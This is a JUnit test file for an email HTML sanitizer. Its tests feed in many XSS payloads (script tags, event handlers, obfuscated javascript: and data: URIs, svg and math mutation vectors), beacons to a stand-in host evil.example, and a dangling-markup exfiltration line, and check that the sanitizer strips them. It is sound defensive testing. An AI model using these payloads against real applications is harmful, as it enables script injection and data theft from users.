package io.kelta.worker.service.mailbox;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Attribute;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Map;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * The platform's first defence against untrusted third-party HTML.
 *
 * <p>Every case here is a real delivery vector, not a hypothetical. The point of the suite is
 * that adding a tag or attribute to the safelist has to break something visible.
 */
@DisplayName("MailboxHtmlSanitizer")
class MailboxHtmlSanitizerTest {

    private final MailboxHtmlSanitizer sanitizer = new MailboxHtmlSanitizer();

    /**
     * Mirror of {@code buildSafelist()} plus what the post-pass adds. Kept here by hand on
     * purpose: widening the policy must mean editing this too, in the same review.
     */
    private static final Map<String, Set<String>> ALLOWED = Map.ofEntries(
            Map.entry("p", Set.of()), Map.entry("br", Set.of()), Map.entry("div", Set.of()),
            Map.entry("span", Set.of()), Map.entry("b", Set.of()), Map.entry("strong", Set.of()),
            Map.entry("i", Set.of()), Map.entry("em", Set.of()), Map.entry("u", Set.of()),
            Map.entry("s", Set.of()), Map.entry("blockquote", Set.of()), Map.entry("pre", Set.of()),
            Map.entry("code", Set.of()), Map.entry("ul", Set.of()), Map.entry("ol", Set.of()),
            Map.entry("li", Set.of()), Map.entry("dl", Set.of()), Map.entry("dt", Set.of()),
            Map.entry("dd", Set.of()), Map.entry("h1", Set.of()), Map.entry("h2", Set.of()),
            Map.entry("h3", Set.of()), Map.entry("h4", Set.of()), Map.entry("h5", Set.of()),
            Map.entry("h6", Set.of()), Map.entry("hr", Set.of()), Map.entry("table", Set.of()),
            Map.entry("thead", Set.of()), Map.entry("tbody", Set.of()), Map.entry("tfoot", Set.of()),
            Map.entry("tr", Set.of()), Map.entry("caption", Set.of()),
            Map.entry("a", Set.of("href", "title", "rel", "target")),
            Map.entry("img", Set.of("src", "alt", "width", "height",
                    MailboxHtmlSanitizer.REMOTE_SRC_ATTR, MailboxHtmlSanitizer.BLOCKED_ATTR,
                    MailboxHtmlSanitizer.CID_ATTR)),
            Map.entry("td", Set.of("colspan", "rowspan")),
            Map.entry("th", Set.of("colspan", "rowspan", "scope")));

    /**
     * Re-parses the output and fails on any element or attribute outside the policy, so a
     * hostile case cannot pass merely because the payload was spelled differently.
     */
    private static Document assertOnlySafeMarkup(String html) {
        Document doc = Jsoup.parseBodyFragment(html == null ? "" : html);
        for (Element el : doc.body().getAllElements()) {
            if (el == doc.body()) {
                continue;
            }
            assertThat(ALLOWED).as("element <%s> in %s", el.tagName(), html)
                    .containsKey(el.tagName());
            for (Attribute attr : el.attributes()) {
                assertThat(ALLOWED.get(el.tagName()))
                        .as("attribute %s on <%s> in %s", attr.getKey(), el.tagName(), html)
                        .contains(attr.getKey());
            }
        }
        return doc;
    }

    @ParameterizedTest(name = "strips {0}")
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<style>body{background:url('//evil.example/beacon')}</style>",
            "<link rel=prefetch href='//evil.example/x'>",
            "<base href='//evil.example/'>",
            "<iframe src='//evil.example'></iframe>",
            "<object data='//evil.example'></object>",
            "<embed src='//evil.example'>",
            "<form action='//evil.example'><input name=x></form>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext></mtext></math>",
            "<noscript><p>x</p></noscript>",
            "<template><p>x</p></template>",
    })
    @DisplayName("Dangerous elements do not survive")
    void stripsDangerousElements(String hostile) {
        String out = sanitizer.sanitize("<p>hello</p>" + hostile).html();
        assertThat(out).doesNotContainIgnoringCase("script")
                .doesNotContainIgnoringCase("<style")
                .doesNotContainIgnoringCase("<link")
                .doesNotContainIgnoringCase("<base")
                .doesNotContainIgnoringCase("<iframe")
                .doesNotContainIgnoringCase("<object")
                .doesNotContainIgnoringCase("<embed")
                .doesNotContainIgnoringCase("<form")
                .doesNotContainIgnoringCase("<svg")
                .doesNotContainIgnoringCase("<math");
        // The legitimate content is kept — a sanitiser that empties the message is not useful.
        assertThat(out).contains("hello");
    }

    @ParameterizedTest(name = "strips {0}")
    @ValueSource(strings = {
            "<p onclick=\"alert(1)\">x</p>",
            "<p onmouseover=alert(1)>x</p>",
            "<img src=x onerror=alert(1)>",
            "<p style=\"background:url('//evil.example')\">x</p>",
            "<p class=\"leak\" id=\"leak\">x</p>",
    })
    @DisplayName("Event handlers, inline style, class and id are all dropped")
    void stripsDangerousAttributes(String hostile) {
        String out = sanitizer.sanitize(hostile).html();
        assertThat(out).doesNotContainIgnoringCase("onclick")
                .doesNotContainIgnoringCase("onmouseover")
                .doesNotContainIgnoringCase("onerror")
                .doesNotContainIgnoringCase("style=")
                .doesNotContainIgnoringCase("class=")
                .doesNotContainIgnoringCase("id=");
    }

    @Test
    @DisplayName("Remote images are parked rather than loaded")
    void parksRemoteImages() {
        MailboxHtmlSanitizer.Result result =
                sanitizer.sanitize("<p>hi</p><img src=\"https://tracker.example/pixel.gif\" alt=\"\">");

        // A remote image is a read receipt: it tells the sender the exact moment an agent opened
        // the message, and leaks the agent's IP.
        //
        // Asserted as " src=" with the leading space rather than 'src="https://...' — the parked
        // attribute is data-kelta-remote-src, which ENDS in "src=", so a naive substring check
        // matches the very thing that proves the URL was parked correctly.
        assertThat(result.html()).doesNotContain(" src=");
        assertThat(result.html()).contains(MailboxHtmlSanitizer.REMOTE_SRC_ATTR);
        assertThat(result.html()).contains(MailboxHtmlSanitizer.BLOCKED_ATTR);
        assertThat(result.blockedImages()).isEqualTo(1);
        // The URL itself is preserved so the agent can opt into loading it.
        assertThat(result.html()).contains("tracker.example/pixel.gif");
    }

    @Test
    @DisplayName("Inline cid: images are rewritten to an internal reference")
    void rewritesCidImages() {
        MailboxHtmlSanitizer.Result result =
                sanitizer.sanitize("<img src=\"cid:logo@example\" alt=\"logo\">");

        assertThat(result.html()).contains(MailboxHtmlSanitizer.CID_ATTR + "=\"logo@example\"");
        assertThat(result.html()).doesNotContain("src=\"cid:");
        assertThat(result.blockedImages()).isZero();
    }

    @ParameterizedTest(name = "refuses href [{0}]")
    @ValueSource(strings = {
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "&#106;avascript:alert(1)",
            "java\tscript:alert(1)",
            "vbscript:msgbox(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    })
    @DisplayName("Only http, https and mailto links keep their href")
    void refusesDangerousLinkSchemes(String href) {
        String out = sanitizer.sanitize("<a href=\"" + href + "\">click</a>").html();
        assertThat(out).doesNotContainIgnoringCase("javascript")
                .doesNotContainIgnoringCase("vbscript")
                .doesNotContainIgnoringCase("data:text/html");
        // The text survives; only the destination is removed.
        assertThat(out).contains("click");
    }

    @Test
    @DisplayName("Surviving links get rel=noopener and open in a new tab")
    void hardensSafeLinks() {
        String out = sanitizer.sanitize("<a href=\"https://example.com\">x</a>").html();
        assertThat(out).contains("href=\"https://example.com\"")
                .contains("rel=\"noopener noreferrer nofollow\"")
                .contains("target=\"_blank\"");
    }

    @Test
    @DisplayName("Comments are removed, including conditional ones")
    void removesComments() {
        String out = sanitizer.sanitize(
                "<p>a</p><!--[if IE]><script>alert(1)</script><![endif]--><!-- plain -->").html();
        assertThat(out).doesNotContain("<!--").doesNotContainIgnoringCase("script");
    }

    @Test
    @DisplayName("Dangling markup cannot swallow the rest of the document")
    void neutralisesDanglingMarkup() {
        // An unterminated attribute is a classic exfiltration trick: everything after it becomes
        // part of the URL. Parsing and re-serialising cannot preserve that.
        String out = sanitizer.sanitize(
                "<img src=\"https://evil.example/?x=<p>secret</p>").html();
        assertThat(out).doesNotContain("evil.example/?x=<p>");
    }

    @Test
    @DisplayName("Ordinary formatting and tables are preserved")
    void keepsLegitimateMarkup() {
        String out = sanitizer.sanitize("""
                <h2>Order</h2><p><strong>Bold</strong> and <em>italic</em></p>
                <table><tr><th scope="col">A</th><td colspan="2">B</td></tr></table>
                <ul><li>one</li></ul><blockquote>quoted</blockquote>
                """).html();
        assertThat(out).contains("<h2>", "<strong>", "<em>", "<table>", "<th", "colspan=\"2\"",
                "<ul>", "<li>", "<blockquote>");
    }

    @Test
    @DisplayName("Oversized input is refused rather than parsed")
    void refusesOversizedInput() {
        MailboxHtmlSanitizer.Result result = sanitizer.sanitize("<p>x</p>".repeat(400_000));
        assertThat(result.truncated()).isTrue();
        assertThat(result.html()).isNull();
    }

    @Test
    @DisplayName("Null and blank input yield nothing, not an exception")
    void handlesEmptyInput() {
        assertThat(sanitizer.sanitize(null).html()).isNull();
        assertThat(sanitizer.sanitize("   ").html()).isNull();
    }

    @ParameterizedTest(name = "refuses obfuscated href [{0}]")
    @ValueSource(strings = {
            "JAVASCRIPT:alert(1)",
            "jAvAsCrIpT:alert(1)",
            "  javascript:alert(1)",
            "\tjavascript:alert(1)",
            "\njavascript:alert(1)",
            "\u0001javascript:alert(1)",
            "&#x01;javascript:alert(1)",
            "&#106;avascript:alert(1)",
            "&#x6A;avascript:alert(1)",
            "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)",
            "jav&#x09;ascript:alert(1)",
            "jav&#x0A;ascript:alert(1)",
            "javascript&colon;alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "DATA:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    })
    @DisplayName("Obfuscated script and data: schemes lose the href entirely")
    void refusesObfuscatedLinkSchemes(String href) {
        String out = sanitizer.sanitize("<a href=\"" + href + "\">click</a>").html();
        Document doc = assertOnlySafeMarkup(out);
        Element a = doc.selectFirst("a");
        assertThat(a).as(out).isNotNull();
        assertThat(a.hasAttr("href")).as(out).isFalse();
        assertThat(out).doesNotContainIgnoringCase("javascript")
                .doesNotContainIgnoringCase("data:text/html")
                .doesNotContainIgnoringCase("<script");
        assertThat(a.text()).isEqualTo("click");
    }

    @ParameterizedTest(name = "refuses img src [{0}]")
    @ValueSource(strings = {
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "&#106;avascript:alert(1)",
            " javascript:alert(1)",
            "vbscript:msgbox(1)",
            "VBScript:msgbox(1)",
    })
    @DisplayName("Script-scheme image sources are dropped, not parked")
    void refusesScriptImageSources(String src) {
        MailboxHtmlSanitizer.Result result =
                sanitizer.sanitize("<p>hi</p><img src=\"" + src + "\" alt=\"a\">");
        Document doc = assertOnlySafeMarkup(result.html());
        Element img = doc.selectFirst("img");
        assertThat(img).as(result.html()).isNotNull();
        assertThat(img.hasAttr("src")).isFalse();
        assertThat(img.hasAttr(MailboxHtmlSanitizer.REMOTE_SRC_ATTR)).isFalse();
        assertThat(img.hasAttr(MailboxHtmlSanitizer.CID_ATTR)).isFalse();
        assertThat(result.html()).doesNotContainIgnoringCase("javascript")
                .doesNotContainIgnoringCase("vbscript");
        assertThat(result.blockedImages()).isZero();
    }

    @ParameterizedTest(name = "strips handler in {0}")
    @ValueSource(strings = {
            "<img src=\"cid:a@b\" onerror=\"alert(1)\">",
            "<img src=\"https://example.com/x.png\" ONERROR=alert(1) onload=alert(1)>",
            "<a href=\"https://example.com\" onclick=\"alert(1)\">x</a>",
            "<a href=\"https://example.com\" OnMouseOver=alert(1) onfocus=alert(1)>x</a>",
            "<table><tr><td onmouseover=\"alert(1)\">x</td><th onclick=alert(1)>y</th></tr></table>",
            "<div onpointerenter=alert(1)><span onanimationstart=alert(1)>x</span></div>",
    })
    @DisplayName("Event handlers on allowed tags are removed")
    void stripsEventHandlersOnAllowedTags(String hostile) {
        String out = sanitizer.sanitize(hostile).html();
        Document doc = assertOnlySafeMarkup(out);
        for (Element el : doc.body().getAllElements()) {
            for (Attribute attr : el.attributes()) {
                assertThat(attr.getKey()).as(out).doesNotStartWith("on");
            }
        }
        assertThat(out).doesNotContain("alert(1)");
    }

    @ParameterizedTest(name = "drops {0}")
    @ValueSource(strings = {
            "<svg onload=\"alert(1)\"><circle r=\"1\"/></svg>",
            "<svg><a xlink:href=\"javascript:alert(1)\"><text>t</text></a></svg>",
            "<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>",
            "<math><maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\">m</maction></math>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
            "<template><script>alert(1)</script><img src=x onerror=alert(1)></template>",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p></noscript>",
            "<noscript><img src=x onerror=alert(1)></noscript>",
            "<style>@import 'javascript:alert(1)'; *{background:url(//evil.example/b)}</style>",
            "<style></style><img src=x onerror=alert(1)>",
    })
    @DisplayName("svg, math, template, noscript and style are dropped and nothing inside them runs")
    void dropsForeignAndInertContainers(String hostile) {
        String out = sanitizer.sanitize("<p>hello</p>" + hostile).html();
        Document doc = assertOnlySafeMarkup(out);
        assertThat(doc.select("svg, math, template, noscript, style, script, foreignObject, maction"))
                .as(out).isEmpty();
        for (Element el : doc.body().getAllElements()) {
            for (Attribute attr : el.attributes()) {
                assertThat(attr.getKey()).as(out).doesNotStartWith("on");
                assertThat(attr.getValue()).as(out).doesNotContainIgnoringCase("javascript:");
            }
        }
        assertThat(out).doesNotContainIgnoringCase("<script")
                .doesNotContainIgnoringCase("<style")
                .doesNotContainIgnoringCase("@import")
                .doesNotContainIgnoringCase("evil.example");
        assertThat(out).contains("hello");
    }

    @ParameterizedTest(name = "strips {0}")
    @ValueSource(strings = {
            "<img src=\"cid:a@b\" srcset=\"https://evil.example/x.png 2x\" style=\"x:y\" class=\"c\" id=\"i\">",
            "<img src=\"https://example.com/a.png\" srcset=\"https://evil.example/x.png 2x\">",
            "<a href=\"https://example.com\" style=\"position:fixed\" class=\"c\" id=\"i\">x</a>",
            "<table><tr><td style=\"background:url(//evil.example)\" class=\"c\" id=\"i\">x</td></tr></table>",
            "<div style=\"x:y\" class=\"c\" id=\"i\"><span style=\"x:y\" class=\"c\">x</span></div>",
    })
    @DisplayName("style, class, id and srcset are removed from allowed tags")
    void stripsPresentationAndSrcsetAttributes(String hostile) {
        String out = sanitizer.sanitize(hostile).html();
        assertOnlySafeMarkup(out);
        assertThat(out).doesNotContainIgnoringCase("style=")
                .doesNotContainIgnoringCase("class=")
                .doesNotContainIgnoringCase(" id=")
                .doesNotContainIgnoringCase("srcset")
                .doesNotContainIgnoringCase("evil.example");
    }

    @Test
    @DisplayName("Every allowed tag and attribute survives a round trip")
    void allowedMarkupRoundTrips() {
        MailboxHtmlSanitizer.Result result = sanitizer.sanitize("""
                <h1>h1</h1><h2>h2</h2><h3>h3</h3><h4>h4</h4><h5>h5</h5><h6>h6</h6>
                <div><p>para<br><span>span</span> <b>b</b> <strong>strong</strong> <i>i</i>
                <em>em</em> <u>u</u> <s>s</s> <code>code</code></p></div>
                <blockquote>quote</blockquote><pre>pre</pre><hr>
                <ul><li>ul</li></ul><ol><li>ol</li></ol><dl><dt>dt</dt><dd>dd</dd></dl>
                <p><a href="https://example.com/x" title="t1">https</a>
                <a href="http://example.com/y" title="t2">http</a>
                <a href="mailto:help@example.com" title="t3">mail</a></p>
                <p><img src="https://cdn.example/a.png" alt="remote" width="10" height="20">
                <img src="http://cdn.example/b.png" alt="remote2">
                <img src="cid:logo@example" alt="inline" width="30" height="40">
                <img src="data:image/png;base64,iVBORw0KGgo=" alt="data" width="1" height="2"></p>
                <table><caption>cap</caption>
                <thead><tr><th scope="col" colspan="2" rowspan="1">th</th></tr></thead>
                <tbody><tr><td colspan="3" rowspan="2">td</td></tr></tbody>
                <tfoot><tr><td>foot</td></tr></tfoot></table>
                """);
        Document doc = assertOnlySafeMarkup(result.html());

        for (String tag : ALLOWED.keySet()) {
            assertThat(doc.select(tag)).as("<%s> in %s", tag, result.html()).isNotEmpty();
        }

        Element https = doc.selectFirst("a:contains(https)");
        assertThat(https.attr("href")).isEqualTo("https://example.com/x");
        assertThat(https.attr("title")).isEqualTo("t1");
        assertThat(https.attr("rel")).isEqualTo("noopener noreferrer nofollow");
        assertThat(https.attr("target")).isEqualTo("_blank");
        assertThat(doc.selectFirst("a:contains(http):not(:contains(https))").attr("href"))
                .isEqualTo("http://example.com/y");
        assertThat(doc.selectFirst("a:contains(mail)").attr("href"))
                .isEqualTo("mailto:help@example.com");

        Element remote = doc.selectFirst("img[alt=remote]");
        assertThat(remote.hasAttr("src")).isFalse();
        assertThat(remote.attr(MailboxHtmlSanitizer.REMOTE_SRC_ATTR))
                .isEqualTo("https://cdn.example/a.png");
        assertThat(remote.attr(MailboxHtmlSanitizer.BLOCKED_ATTR)).isEqualTo("1");
        assertThat(remote.attr("width")).isEqualTo("10");
        assertThat(remote.attr("height")).isEqualTo("20");
        Element remote2 = doc.selectFirst("img[alt=remote2]");
        assertThat(remote2.hasAttr("src")).isFalse();
        assertThat(remote2.attr(MailboxHtmlSanitizer.REMOTE_SRC_ATTR))
                .isEqualTo("http://cdn.example/b.png");
        assertThat(result.blockedImages()).isEqualTo(2);

        Element inline = doc.selectFirst("img[alt=inline]");
        assertThat(inline.hasAttr("src")).isFalse();
        assertThat(inline.attr(MailboxHtmlSanitizer.CID_ATTR)).isEqualTo("logo@example");
        assertThat(inline.attr("width")).isEqualTo("30");
        assertThat(inline.attr("height")).isEqualTo("40");

        Element data = doc.selectFirst("img[alt=data]");
        assertThat(data.attr("src")).isEqualTo("data:image/png;base64,iVBORw0KGgo=");
        assertThat(data.attr("width")).isEqualTo("1");
        assertThat(data.attr("height")).isEqualTo("2");

        Element th = doc.selectFirst("th");
        assertThat(th.attr("scope")).isEqualTo("col");
        assertThat(th.attr("colspan")).isEqualTo("2");
        assertThat(th.attr("rowspan")).isEqualTo("1");
        Element td = doc.selectFirst("td");
        assertThat(td.attr("colspan")).isEqualTo("3");
        assertThat(td.attr("rowspan")).isEqualTo("2");
        assertThat(doc.selectFirst("caption").text()).isEqualTo("cap");
    }
}
